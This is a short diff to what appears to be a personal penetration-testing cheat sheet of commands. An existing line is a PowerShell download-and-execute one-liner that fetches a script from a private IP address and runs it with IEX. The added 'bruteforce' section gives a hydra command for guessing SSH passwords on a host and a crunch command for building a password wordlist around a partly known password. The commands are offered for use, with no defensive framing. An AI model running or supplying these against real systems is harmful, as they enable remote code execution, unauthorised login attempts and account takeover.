@@ -15,3 +15,10 @@ few scripts and useful commands
 <ul>
 <li>powershell IEX (New-Object Net.WebClient).DownloadString('http://10.133.127.172:85/test.ps1')</li>
 </ul>
+
+# bruteforce
+<ul>
+<li>hydra -l user -P wordlist.txt 192.168.10.130 ssh</li>
+<p>generate wordlist from a password with 2 missing characters :</p>
+<li>crunch 7 7 -t passwo^% >> wordlist.txt</li>
+</ul>
